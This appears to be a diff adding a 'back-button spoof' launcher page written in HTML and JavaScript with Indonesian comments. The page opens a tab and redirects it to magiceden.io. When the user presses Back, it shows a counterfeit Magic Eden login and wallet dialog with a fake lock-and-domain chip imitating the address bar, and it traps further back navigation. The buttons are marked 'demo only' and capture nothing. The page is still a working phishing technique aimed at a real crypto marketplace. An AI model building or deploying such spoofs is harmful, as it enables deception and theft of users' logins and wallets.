@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ME Back-Spoof Launcher</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="font-family:system-ui,sans-serif;padding:24px">
+  <h2>Launch Magic Eden back-button spoof</h2>
+  <button onclick="launch()">Open</button>
+
+<script>
+function launch(){
+  const w = window.open('about:blank', '_blank');
+  if(!w){ alert('Popup blocked'); return; }
+
+  // Halaman "penampung" di tab baru
+  const payload = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Magic Eden</title>
+<style>
+  :root{--bg:#0d0d0f;--panel:#111318;--fg:#fff;--muted:#9aa0a6;--border:#23262b;--btn:#7a3ff0;--btn2:#1a1d22;--acc:#9b59ff}
+  html,body{height:100%} body{margin:0;background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Arial,sans-serif;display:flex;align-items:center;justify-content:center}
+  .backdrop{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:saturate(140%) blur(2px);display:flex;align-items:center;justify-content:center}
+  .modal{width:min(92vw,460px);background:var(--panel);border:1px solid var(--border);border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.45);padding:22px}
+  h2{margin:0 0 16px;font-size:20px;font-weight:700}
+  .field{display:flex;gap:10px;margin:10px 0 14px}
+  .field input{flex:1;background:#15181d;border:1px solid #2a2e35;border-radius:10px;padding:12px 14px;color:var(--fg);font-size:15px;outline:none}
+  .field input::placeholder{color:#7a8089}
+  .primary{width:100%;border:0;border-radius:10px;background:var(--btn);padding:12px 14px;color:#fff;font-weight:600;font-size:15px;cursor:pointer}
+  .or{display:flex;align-items:center;gap:10px;color:#8b9097;font-size:12px;margin:14px 0}
+  .or:before,.or:after{content:"";flex:1;height:1px;background:#252a31}
+  .wallet{width:100%;display:flex;align-items:center;justify-content:space-between;gap:10px;background:var(--btn2);border:1px solid #2a2e35;color:#d7d9dd;border-radius:12px;padding:12px 14px;cursor:pointer}
+  .foot{margin-top:14px;color:#717782;font-size:12px;line-height:1.45}
+  .chip{position:fixed;top:12px;left:50%;transform:translateX(-50%);background:#0f1115;border:1px solid #262a31;color:#c9ccd1;padding:6px 10px;border-radius:999px;font-size:12px;display:flex;gap:6px;align-items:center;box-shadow:0 6px 22px rgba(0,0,0,.35)}
+  .lock{width:12px;height:12px;border:2px solid #6ee7a1;border-radius:2px;display:inline-block}
+</style>
+</head>
+<body>
+  <script>
+    // Konfigurasi
+    const TARGET = "https://magiceden.io:81/";
+    const FLAG   = "me_back_spoof_armed";
+    const BACK_TRAP = true; // set false kalau tak mau perangkap back
+
+    // Pertama kali: tandai lalu redirect ke domain asli (agar address bar menunjukkan magiceden.io)
+    if (!sessionStorage.getItem(FLAG)) {
+      sessionStorage.setItem(FLAG, "1");
+      setTimeout(()=>{ location.href = TARGET; }, 120);
+    }
+
+    // Saat user menekan BACK dari magiceden.io → halaman ini aktif lagi (BFCache)
+    window.addEventListener("pageshow", () => {
+      if (sessionStorage.getItem(FLAG)) showSpoof();
+    });
+
+    function showSpoof(){
+      document.body.innerHTML = \`
+        <div class="chip"><span class="lock"></span><span>magiceden.io</span></div>
+        <div class="backdrop">
+          <div class="modal" role="dialog" aria-modal="true">
+            <h2>Log in or sign up</h2>
+            <div class="field">
+              <input id="email" type="email" placeholder="Enter your email">
+            </div>
+            <button class="primary" id="cont">Continue</button>
+            <div class="or">OR</div>
+            <button class="wallet" id="wallets">
+              <div><strong>ME Wallet</strong> <span style="font-size:11px;color:#9aa0a6">• Earn $ME</span></div>
+              <div style="font-size:11px;color:#9aa0a6">View all wallets • 510+ available</div>
+            </button>
+            <div class="foot">
+              If you have not logged in before, you will create a new Magic Eden account.
+              By proceeding, you agree to our <u>Terms of Service</u> & <u>Privacy Policy</u>.
+            </div>
+          </div>
+        </div>\`;
+
+      // Demo only: cegah aksi apa pun
+      document.getElementById('cont').onclick = (e)=>{ e.preventDefault(); alert('Demo: Continue (no action)'); };
+      document.getElementById('wallets').onclick = ()=> alert('Demo: View all wallets (no action)');
+
+      // Back-button trap (opsional)
+      if (BACK_TRAP) {
+        history.pushState(null, '', location.href);
+        addEventListener('popstate', () => history.pushState(null, '', location.href));
+      }
+    }
+  <\/script>
+</body>
+</html>
+  `;
+
+  w.document.open(); w.document.write(payload); w.document.close();
+}
+</script>
+</body>
+</html>
